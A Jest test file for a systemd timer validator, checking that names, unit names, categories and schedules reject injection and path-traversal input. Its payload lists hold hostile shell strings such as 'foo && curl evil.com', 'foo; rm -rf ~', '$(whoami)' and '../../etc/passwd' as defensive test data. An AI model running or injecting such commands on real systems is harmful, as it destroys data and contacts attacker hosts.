'use strict';

/**
 * tests/validator.test.js
 *
 * Unit tests for timerValidator.js — specifically the injection-surface
 * payloads called out in the security spec.
 */

const {
  validateName,
  validateUnitName,
  validateMessage,
  validateCategory,
  validateSchedule,
} = require('../src/validators/timerValidator');

// ── validateName ──────────────────────────────────────────────────────────────
describe('validateName', () => {
  test('accepts clean lowercase names', () => {
    expect(validateName('hydrate').valid).toBe(true);
    expect(validateName('move-break').valid).toBe(true);
    expect(validateName('a1b2c3').valid).toBe(true);
  });

  test('rejects command-injection payloads', () => {
    const payloads = [
      '"; touch /tmp/pwned #',
      '`id`',
      '$(whoami)',
      '../../etc/passwd',
      'foo; rm -rf ~',
      'foo && curl evil.com',
      'foo\nbar',
      '',
      ' ',
      'A'.repeat(49), // too long
    ];
    for (const p of payloads) {
      const r = validateName(p);
      expect(r.valid).toBe(false);
    }
  });

  test('rejects uppercase (must be lowercase)', () => {
    expect(validateName('HydRate').valid).toBe(false);
  });
});

// ── validateUnitName ──────────────────────────────────────────────────────────
describe('validateUnitName', () => {
  test('accepts valid custom timer names', () => {
    expect(validateUnitName('custom-hydrate.timer').valid).toBe(true);
    expect(validateUnitName('custom-move-break.timer').valid).toBe(true);
  });

  test('rejects non-custom units (prevents touching system units)', () => {
    expect(validateUnitName('movebreak.timer').valid).toBe(false);
    expect(validateUnitName('systemd-tmpfiles-clean.timer').valid).toBe(false);
  });

  test('rejects path-traversal payloads', () => {
    const payloads = [
      '../../etc/cron.d/evil.timer',
      '../custom-foo.timer',
      'custom-foo.timer; rm -rf ~',
      'custom-foo.service',  // wrong extension
    ];
    for (const p of payloads) {
      expect(validateUnitName(p).valid).toBe(false);
    }
  });
});

// ── validateMessage ───────────────────────────────────────────────────────────
describe('validateMessage', () => {
  test('accepts normal messages', () => {
    expect(validateMessage('Time to stretch!').valid).toBe(true);
    expect(validateMessage('Drink water 💧').valid).toBe(true);
  });

  test('returns cleaned message without control chars', () => {
    const r = validateMessage('hello\x00world\x07');
    expect(r.valid).toBe(true);
    expect(r.cleaned).toBe('helloworld');
  });

  // Shell metacharacters in the message are safe because the message is
  // written to an Environment= variable and passed via execFile argv,
  // never interpolated into a shell command string. But we still verify
  // the validator doesn't reject them (they're valid user content).
  test('accepts messages with shell metacharacters (safe by design — no shell interpolation)', () => {
    const payloads = [
      '"; touch /tmp/pwned #',
      '`id`',
      '$(whoami)',
      'foo && bar',
      'foo; bar',
    ];
    for (const p of payloads) {
      expect(validateMessage(p).valid).toBe(true);
    }
  });

  test('rejects empty message', () => {
    expect(validateMessage('').valid).toBe(false);
    expect(validateMessage('   ').valid).toBe(false);
  });

  test('rejects message over 500 chars', () => {
    expect(validateMessage('a'.repeat(501)).valid).toBe(false);
  });
});

// ── validateCategory ──────────────────────────────────────────────────────────
describe('validateCategory', () => {
  test('accepts valid categories', () => {
    expect(validateCategory('health').valid).toBe(true);
    expect(validateCategory('work').valid).toBe(true);
    expect(validateCategory(null).valid).toBe(true);
  });

  test('rejects injection payloads', () => {
    expect(validateCategory('foo; bar').valid).toBe(false);
    expect(validateCategory('../../etc').valid).toBe(false);
  });
});

// ── validateSchedule ──────────────────────────────────────────────────────────
describe('validateSchedule', () => {
  // We mock execFileAsync to avoid actually shelling out in unit tests
  const mockExecOk = jest.fn().mockResolvedValue({ stdout: 'OK', stderr: '' });
  const mockExecFail = jest.fn().mockRejectedValue(
    Object.assign(new Error('bad expr'), { stderr: 'Failed to parse' })
  );

  test('resolves valid for good schedule (mocked systemd-analyze ok)', async () => {
    const r = await validateSchedule('Mon-Fri *-*-* 09:00:00', mockExecOk);
    expect(r.valid).toBe(true);
    // Confirm it called execFileAsync with array args, not a shell string
    expect(mockExecOk).toHaveBeenCalledWith(
      'systemd-analyze',
      ['calendar', 'Mon-Fri *-*-* 09:00:00']
    );
  });

  test('resolves invalid for bad schedule (mocked systemd-analyze fail)', async () => {
    const r = await validateSchedule('not-a-valid-schedule', mockExecFail);
    expect(r.valid).toBe(false);
    expect(r.code).toBe('INVALID_SCHEDULE');
  });

  test('rejects empty schedule', async () => {
    const r = await validateSchedule('', mockExecOk);
    expect(r.valid).toBe(false);
  });

  test('rejects schedule > 200 chars', async () => {
    const r = await validateSchedule('a'.repeat(201), mockExecOk);
    expect(r.valid).toBe(false);
  });

  test('injection payloads are passed safely as argv (cannot shell-inject)', async () => {
    // Even if the payload is a shell injection string, it goes as a literal
    // argument to systemd-analyze — no shell expansion occurs.
    // The test confirms the exec is called with an array (not a string).
    const payload = '"; touch /tmp/pwned #';
    await validateSchedule(payload, mockExecOk);
    expect(mockExecOk).toHaveBeenCalledWith('systemd-analyze', ['calendar', payload]);
  });
});
